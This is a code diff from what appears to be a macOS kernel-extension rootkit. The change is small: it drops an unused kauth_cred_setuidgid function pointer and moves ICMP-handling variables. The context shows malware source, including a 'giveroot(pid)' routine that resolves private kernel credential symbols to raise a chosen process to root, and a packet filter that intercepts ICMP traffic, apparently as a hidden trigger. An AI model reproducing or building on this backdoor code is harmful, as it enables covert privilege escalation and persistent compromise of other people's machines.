@@ -66,7 +66,6 @@ typedef kauth_cred_t (*kauth_cred_proc_refp)(proc_t);
 typedef void (*kauth_cred_unrefp)(kauth_cred_t *);
 typedef posix_cred_t (*posix_cred_getp)(kauth_cred_t);
 typedef int (*chgproccntp)(uid_t, int);
-typedef kauth_cred_t (*kauth_cred_setuidgidp)(kauth_cred_t, uid_t, gid_t);
 
 ipfilter_t g_ip_filter_ipv4_ref = NULL;
 
@@ -84,7 +83,6 @@ kern_return_t giveroot(int pid)
 	struct proc *p;
 	lck_mtx_lockp lck_mtx_lock;
 	lck_mtx_unlockp lck_mtx_unlock;
-	kauth_cred_setuidgidp kauth_cred_setuidgid;
 	kauth_cred_proc_refp kauth_cred_proc_ref;
 	kauth_cred_unrefp kauth_cred_unref;
 	posix_cred_getp posix_cred_get;
@@ -92,7 +90,6 @@ kern_return_t giveroot(int pid)
 	
 	mach_vm_address_t lck_mtx_lock_sym = solve_k_sym(&g_kernel_info, "_lck_mtx_lock");
 	mach_vm_address_t lck_mtx_unlock_sym = solve_k_sym(&g_kernel_info, "_lck_mtx_unlock");
-	mach_vm_address_t kauth_cred_setuidgid_sym = solve_k_sym(&g_kernel_info, "_kauth_cred_setuidgid");
 	mach_vm_address_t kauth_cred_proc_ref_sym = solve_k_sym(&g_kernel_info, "_kauth_cred_proc_ref");
 	mach_vm_address_t kauth_cred_unref_sym = solve_k_sym(&g_kernel_info, "_kauth_cred_unref");
 	mach_vm_address_t posix_cred_get_sym = solve_k_sym(&g_kernel_info, "_posix_cred_get");
@@ -103,14 +100,12 @@ kern_return_t giveroot(int pid)
 	   kauth_cred_proc_ref_sym == 0 ||
 	   kauth_cred_unref_sym == 0 ||
 	   posix_cred_get_sym == 0 ||
-	   chgproccnt_sym == 0 ||
-	   kauth_cred_setuidgid_sym == 0) {
+	   chgproccnt_sym == 0) {
 		return KERN_FAILURE;
 	}
 	
 	lck_mtx_lock = (lck_mtx_lockp)lck_mtx_lock_sym;
 	lck_mtx_unlock = (lck_mtx_unlockp)lck_mtx_unlock_sym;
-	kauth_cred_setuidgid = (kauth_cred_setuidgidp)kauth_cred_setuidgid_sym;
 	kauth_cred_proc_ref = (kauth_cred_proc_refp)kauth_cred_proc_ref_sym;
 	kauth_cred_unref = (kauth_cred_unrefp)kauth_cred_unref_sym;
 	posix_cred_get = (posix_cred_getp)posix_cred_get_sym;
@@ -180,8 +175,6 @@ static void print_ip(uint32_t ip_addr)
 
 static errno_t ifc_ipf_input(void *cookie, mbuf_t *data, int offset, u_int8_t protocol)
 {
-	char buf[IP_BUF_SIZE];
-	struct icmp *icmp;
 	struct ip *ipv4hdr;
 	
 	if(data == NULL) {
@@ -192,6 +185,9 @@ static errno_t ifc_ipf_input(void *cookie, mbuf_t *data, int offset, u_int8_t pr
 	
 	/* only intercept ICMP packet */
 	if(protocol == IPPROTO_ICMP) {
+		char buf[IP_BUF_SIZE];
+		struct icmp *icmp;
+		
 		mbuf_copydata(*data, offset, IP_BUF_SIZE, buf);
 		
 		icmp = (struct icmp *)&buf;
